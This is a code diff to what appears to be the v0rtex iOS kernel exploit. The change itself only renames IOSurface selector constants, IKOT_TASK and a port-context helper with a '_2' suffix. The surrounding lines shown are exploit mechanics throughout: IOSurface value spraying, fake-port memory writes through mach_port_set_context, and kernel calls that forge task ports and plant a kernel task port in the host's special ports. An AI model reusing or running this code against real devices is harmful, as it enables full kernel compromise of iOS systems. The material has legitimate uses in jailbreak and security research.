@@ -38,12 +38,12 @@
 
 #define KPTR_ALIGN(addr) (((addr) + sizeof(kptr_t) - 1) & ~(sizeof(kptr_t) - 1))
 
-const uint64_t IOSURFACE_CREATE_SURFACE =  0;
-const uint64_t IOSURFACE_SET_VALUE      =  9;
-const uint64_t IOSURFACE_GET_VALUE      = 10;
-const uint64_t IOSURFACE_DELETE_VALUE   = 11;
+const uint64_t IOSURFACE_CREATE_SURFACE_2 =  0;
+const uint64_t IOSURFACE_SET_VALUE_2      =  9;
+const uint64_t IOSURFACE_GET_VALUE_2      = 10;
+const uint64_t IOSURFACE_DELETE_VALUE_2   = 11;
 
-const uint32_t IKOT_TASK                = 2;
+const uint32_t IKOT_TASK_2                = 2;
 
 enum
 {
@@ -177,7 +177,7 @@ static kern_return_t my_mach_port_get_context(task_t task, mach_port_name_t name
     return ret;
 }
 
-kern_return_t my_mach_port_set_context(task_t task, mach_port_name_t name, mach_vm_address_t context)
+kern_return_t my_mach_port_set_context_2(task_t task, mach_port_name_t name, mach_vm_address_t context)
 {
 #pragma pack(4)
     typedef struct {
@@ -274,7 +274,7 @@ static kern_return_t reallocate_buf(io_connect_t client, uint32_t surfaceId, uin
     Reply *DOutP = &DMess.Out;
     
     DInP->NDR = NDR_record;
-    DInP->selector = IOSURFACE_DELETE_VALUE;
+    DInP->selector = IOSURFACE_DELETE_VALUE_2;
     DInP->scalar_inputCnt = 0;
     
     DInP->inband_input[0] = surfaceId;
@@ -306,7 +306,7 @@ static kern_return_t reallocate_buf(io_connect_t client, uint32_t surfaceId, uin
     Reply *SOutP = &SMess.Out;
     
     SInP->NDR = NDR_record;
-    SInP->selector = IOSURFACE_SET_VALUE;
+    SInP->selector = IOSURFACE_SET_VALUE_2;
     SInP->scalar_inputCnt = 0;
     
     SInP->inband_inputCnt = 0;
@@ -479,7 +479,7 @@ kern_return_t v0rtex_old(task_t *tfp0, kptr_t *kslide, kptr_t *kernucred, kptr_t
         } data;
     } surface;
     size_t size = sizeof(surface);
-    ret = IOConnectCallStructMethod(client, IOSURFACE_CREATE_SURFACE, dict_create, sizeof(dict_create), &surface, &size);
+    ret = IOConnectCallStructMethod(client, IOSURFACE_CREATE_SURFACE_2, dict_create, sizeof(dict_create), &surface, &size);
     LOG("newSurface: %s", mach_error_string(ret));
     if(ret != KERN_SUCCESS)
     {
@@ -663,7 +663,7 @@ kern_return_t v0rtex_old(task_t *tfp0, kptr_t *kslide, kptr_t *kernucred, kptr_t
         }
         uint32_t dummy;
         size = sizeof(dummy);
-        ret = IOConnectCallStructMethod(client, IOSURFACE_SET_VALUE, dict, sizeof(dict), &dummy, &size);
+        ret = IOConnectCallStructMethod(client, IOSURFACE_SET_VALUE_2, dict, sizeof(dict), &dummy, &size);
         if(ret != KERN_SUCCESS)
         {
             LOG("setValue(%u): %s", i, mach_error_string(ret));
@@ -741,7 +741,7 @@ kern_return_t v0rtex_old(task_t *tfp0, kptr_t *kslide, kptr_t *kernucred, kptr_t
     
     uint32_t response[4 + (DATA_SIZE / sizeof(uint32_t))] = { 0 };
     size = sizeof(response);
-    ret = IOConnectCallStructMethod(client, IOSURFACE_GET_VALUE, request, sizeof(request), response, &size);
+    ret = IOConnectCallStructMethod(client, IOSURFACE_GET_VALUE_2, request, sizeof(request), response, &size);
     LOG("getValue(%u): 0x%lx bytes, %s", idx, size, mach_error_string(ret));
     if(ret != KERN_SUCCESS)
     {
@@ -783,7 +783,7 @@ kern_return_t v0rtex_old(task_t *tfp0, kptr_t *kslide, kptr_t *kernucred, kptr_t
     }
     
     size = sizeof(response);
-    ret = IOConnectCallStructMethod(client, IOSURFACE_GET_VALUE, request, sizeof(request), response, &size);
+    ret = IOConnectCallStructMethod(client, IOSURFACE_GET_VALUE_2, request, sizeof(request), response, &size);
     LOG("getValue(%u): 0x%lx bytes, %s", idx, size, mach_error_string(ret));
     if(ret != KERN_SUCCESS)
     {
@@ -819,7 +819,7 @@ do \
 { \
 for(size_t i = 0; i < ((len) + sizeof(uint32_t) - 1) / sizeof(uint32_t); ++i) \
 { \
-ret = my_mach_port_set_context(self, fakeport, (addr) + i * sizeof(uint32_t)); \
+ret = my_mach_port_set_context_2(self, fakeport, (addr) + i * sizeof(uint32_t)); \
 if(ret != KERN_SUCCESS) \
 { \
 LOG("mach_port_set_context: %s", mach_error_string(ret)); \
@@ -1146,8 +1146,8 @@ zm_tmp < zm_hdr.start ? zm_tmp + 0x100000000 : zm_tmp \
     LOG("zm_port addr: " ADDR, ptrs[0]);
     LOG("km_port addr: " ADDR, ptrs[1]);
     
-    KCALL(OFF(IPC_KOBJECT_SET), ptrs[0], zm_task_addr, IKOT_TASK, 0, 0, 0, 0);
-    KCALL(OFF(IPC_KOBJECT_SET), ptrs[1], km_task_addr, IKOT_TASK, 0, 0, 0, 0);
+    KCALL(OFF(IPC_KOBJECT_SET), ptrs[0], zm_task_addr, IKOT_TASK_2, 0, 0, 0, 0);
+    KCALL(OFF(IPC_KOBJECT_SET), ptrs[1], km_task_addr, IKOT_TASK_2, 0, 0, 0, 0);
     
     r = KCALL(OFF(COPYIN), ptrs, self_task + OFFSET_TASK_ITK_REGISTERED, sizeof(ptrs), 0, 0, 0, 0);
     LOG("copyin: %s", errstr(r));
@@ -1195,7 +1195,7 @@ zm_tmp < zm_hdr.start ? zm_tmp + 0x100000000 : zm_tmp \
     
     kptr_t newport = ZM_FIX_ADDR(KCALL(OFF(IPC_PORT_ALLOC_SPECIAL), ipc_space_kernel, 0, 0, 0, 0, 0, 0));
     LOG("newport: " ADDR, newport);
-    KCALL(OFF(IPC_KOBJECT_SET), newport, remap_addr, IKOT_TASK, 0, 0, 0, 0);
+    KCALL(OFF(IPC_KOBJECT_SET), newport, remap_addr, IKOT_TASK_2, 0, 0, 0, 0);
     KCALL(OFF(IPC_PORT_MAKE_SEND), newport, 0, 0, 0, 0, 0, 0);
     r = KCALL(OFF(COPYIN), &newport, OFF(REALHOST) + OFFSET_REALHOST_SPECIAL + sizeof(kptr_t) * 4, sizeof(kptr_t), 0, 0, 0, 0);
     LOG("copyin: %s", errstr(r));
